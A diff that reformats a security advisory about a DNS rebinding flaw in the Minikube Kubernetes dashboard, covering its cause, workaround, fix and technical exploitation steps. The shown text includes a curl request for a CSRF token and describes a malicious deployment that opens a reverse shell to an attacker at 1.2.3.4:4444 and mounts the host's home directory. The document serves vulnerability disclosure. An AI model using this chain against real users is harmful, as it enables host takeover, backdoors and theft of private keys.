@@ -38,11 +38,11 @@ The Kubernetes dashboard is enabled by default on Minikube installations and is 
 
 A malicious web page may nonetheless interact with the dashboard through a DNS rebinding attack.
 
-DNS rebinding allows a web page to bypass the Same-Origin Policy by dynamically manipulating the DNS records of a domain. For example, the domain attacker.com may initially map to an external IP address such as 1.2.3.4 to deliver a malicious JavaScript payload. The domain’s A record can then be remapped to an internal IP, such as 192.168.99.100. The JavaScript payload can then communicate with the internal IP without violating the Same-Origin Policy.
+DNS rebinding allows a web page to bypass the Same-Origin Policy by dynamically manipulating the DNS records of a domain. For example, the domain attacker.com may initially map to an external IP address such as `1.2.3.4` to deliver a malicious JavaScript payload. The domain’s A record can then be remapped to an internal IP, such as `192.168.99.100`. The JavaScript payload can then communicate with the internal IP without violating the Same-Origin Policy.
 
 The Kubernetes dashboard service on a Minikube installation is vulnerable to DNS rebinding because:
 
-* the Minikube VM uses predictable IP addresses (for example 192.168.99.100 for VirtualBox or 192.168.64.1 for Hyperkit)
+* the Minikube VM uses predictable IP addresses (for example `192.168.99.100` for VirtualBox or `192.168.64.1` for Hyperkit)
 * the service runs on a known port: 30000/TCP
 * the service does not use HTTPS
 * the service does not validate the HTTP Host header
@@ -53,11 +53,11 @@ The VirtualBox, VMWare Fusion and Xhyve drivers will mount the host user's home 
 
 ![chain of mounts](https://alex.kaskaso.li/images/posts/minikube_mount_chain.png "chain of mounts"){: .center-image }
 
-The attacker may then, for example, backdoor the user's .bash_profile, or retrieve private keys to gain access to other systems.
+The attacker may then, for example, backdoor the user's `.bash_profile`, or retrieve private keys to gain access to other systems.
 
 ## ## Interim Workaround
 
-The issue affects versions of Minikube prior to 0.30.0. If running on an affected version, it is recommended to disable the Kubernetes dashboard service from Minikube:
+The issue affects versions of Minikube prior to `0.30.0`. If running on an affected version, it is recommended to disable the Kubernetes dashboard service from Minikube:
 
 ```
 $ minikube addons disable dashboard
@@ -65,19 +65,19 @@ $ minikube addons disable dashboard
 
 ## ## Solution
 
-The issue was fixed in release 0.30.0. It is recommended to upgrade.
+The issue was fixed in release `0.30.0`. It is recommended to upgrade.
 
 The issue was remediated by:
 
-* exposing the service through kubectl proxy instead of a NodePort
-* validating the Host header from incoming HTTP requests matches the pattern 127.0.0.1:{port}
+* exposing the service through `kubectl proxy` instead of a `NodePort`
+* validating the Host header from incoming HTTP requests matches the pattern `127.0.0.1:{port}`
 * exposing the dashboard service on a random port
 
 ## ## Technical Details
 
 A malicious web page will start by triggering a DNS rebind against the Kubernetes dashboard to bypass the Same-Origin Policy. From then on, the page will be in a position to read responses from the dashboard.
 
-The page can then issue a GET request to /api/v1/csrftoken/appdeploymentfromfile to obtain a valid CSRF token for a deployment from the dashboard. A curl request for obtaining a CSRF token is given below:
+The page can then issue a GET request to `/api/v1/csrftoken/appdeploymentfromfile` to obtain a valid CSRF token for a deployment from the dashboard. A curl request for obtaining a CSRF token is given below:
 
 ```
 $ curl http://192.168.99.100:30000/api/v1/csrftoken/appdeploymentfromfile
@@ -86,9 +86,9 @@ $ curl http://192.168.99.100:30000/api/v1/csrftoken/appdeploymentfromfile
 }
 ```
 
-The page can proceed to post an arbitrary deployment to the dashboard, using the above token to set the X-CSRF-TOKEN header. An attacker could, for example, create a deployment with a container that will connect a reverse shell back to the attacker. The attacker may also wish to mount the host user's home directory into the container, trivially breaking out of the container and hypervisor.
+The page can proceed to post an arbitrary deployment to the dashboard, using the above token to set the `X-CSRF-TOKEN` header. An attacker could, for example, create a deployment with a container that will connect a reverse shell back to the attacker. The attacker may also wish to mount the host user's home directory into the container, trivially breaking out of the container and hypervisor.
 
-The deployment below will create a reverse shell back to an attacker at 1.2.3.4:4444 and mount the home directory of a MacOS user:
+The deployment below will create a reverse shell back to an attacker at `1.2.3.4:4444` and mount the home directory of a MacOS user:
 
 ```yaml
 apiVersion: v1
@@ -164,7 +164,7 @@ targets:
     script: "minikube"
 ```
 
-Finally, the custom payload should be stored in dref/scripts/src/payloads/minikube.js:
+Finally, the custom payload should be stored in `dref/scripts/src/payloads/minikube.js`:
 
 ```javascript
 import NetMap from 'netmap.js'
@@ -241,7 +241,7 @@ if (window.args && window.args._rebind) rebind()
 else main()
 ```
 
-A Minikube user visiting http://minikube.{dref_domain}.com will be exploited and a reverse shell with the host’s file system mounted will be given to the attacker on 1.2.3.4:4444.
+A Minikube user visiting `http://minikube.{dref_domain}.com` will be exploited and a reverse shell with the host’s file system mounted will be given to the attacker on `1.2.3.4:4444`.
 
 ## ## Detailed Timeline
 
